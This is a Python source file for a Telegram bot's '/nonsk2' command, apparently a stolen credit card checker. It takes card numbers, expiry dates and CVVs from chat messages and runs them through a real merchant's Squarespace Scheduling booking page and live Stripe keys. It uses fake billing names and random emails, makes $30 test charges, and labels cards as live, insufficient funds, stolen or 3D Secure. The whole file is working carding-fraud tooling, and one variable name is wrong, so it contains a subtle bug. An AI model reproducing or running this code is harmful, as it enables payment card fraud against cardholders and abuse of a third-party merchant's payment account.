import requests
import time
import json
import uuid
import random
import string
import urllib3

def process_nonsk2_command(bot, message):
    chat_id = message.chat.id
    cc_data = message.text.split()[1:]  # Get the CC data from the command
    if cc_data:
        total_cards = len(cc_data)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK2 CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for cc in cc_data:
            result = check_nonsk2_card(cc)
            results.append(f"CC: {cc}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide CC details in the format: /nonsk2 cc|mon|year|cvv")

def check_nonsk2_card(cc):
    try:
        cc_number, exp_month, exp_year, cvv = cc.split('|')
    except ValueError:
        return "Invalid CC format❌"

    session = requests.Session()
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    headers = {
        "User-Agent": user_agent,
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Step 1: Get PHPSESSID
    session.get("https://app.squarespacescheduling.com/schedule.php?owner=21346949&calendarID=4717062", headers=headers)
    phpsessid = session.cookies.get('PHPSESSID')

    # Step 2: Create Payment Method
    payment_method_data = {
        "type": "card",
        "billing_details[name]": "Jame Mong",
        "billing_details[email]": f"jamede{random_string()}@gmail.com",
        "billing_details[address][postal_code]": "10080",
        "card[number]": cc_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "card[cvc]": cvc,
        "guid": generate_guid(),
        "muid": generate_guid(),
        "sid": generate_guid(),
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/04dac047e0; stripe-js-v3/04dac047e0; card-element",
        "time_on_page": "193418",
        "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
        "_stripe_account": "acct_1Hr4hzAnMU46zgL6"
    }

    response = session.post("https://api.stripe.com/v1/payment_methods", data=payment_method_data, headers=headers)
    response_data = response.json()
    payment_method_id = response_data.get('id')

    if not payment_method_id:
        return f"Failed to create payment method❌: {response_data.get('error', {}).get('message', 'Unknown error')}"

    # Step 3: Get Payment Intent
    payment_intent_data = {
        "amount": "30",
        "clientDetails[name]": "Jame Mong",
        "clientDetails[address_zip]": "10080",
        "clientDetails[email]": f"jamede{random_string()}@gmail.com",
        "description": "1112891149 - Jame Mong - Standard Studio A Rental - September 7, 2023 4:00pm",
        "pm": payment_method_id
    }

    response = session.post(f"https://app.squarespacescheduling.com/schedule.php?action=getIntent&owner=21204314&PHPSESSID={phpsessid}", data=payment_intent_data, headers=headers)
    response_data = response.json()
    payment_intent_id = response_data.get('intent')
    client_secret = response_data.get('clientSecret')

    if not payment_intent_id or not client_secret:
        return f"Failed to get payment intent❌: {response_data.get('error', {}).get('message', 'Unknown error')}"

    # Step 4: Confirm Payment Intent
    confirm_payment_data = {
        "payment_method": payment_method_id,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
        "_stripe_account": "acct_1Hr4hzAnMU46zgL6",
        "client_secret": client_secret
    }

    response = session.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm", data=confirm_payment_data, headers=headers)
    response_data = response.json()

    if "succeeded" in response_data.get("status", ""):
        return "30$✅ CCN"
    elif "incorrect_cvc" in response_data.get("error", {}).get("decline_code", ""):
        return "CCN"
    elif "insufficient_funds" in response_data.get("error", {}).get("decline_code", ""):
        return "NSF"
    elif "stolen_card" in response_data.get("error", {}).get("decline_code", ""):
        return "STOLEN"
    elif "three_d_secure_redirect" in response_data.get("error", {}).get("decline_code", ""):
        return "3DSECURE"
    elif "rate_limit" in response_data.get("error", {}).get("decline_code", ""):
        return "RATE LIMIT"
    else:
        error_message = response_data.get('error', {}).get('message', 'Unknown error')
        return f"Declined: {error_message}"

def random_string():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def generate_guid():
    return str(uuid.uuid4())

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total CARD Checked - {total_cards}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
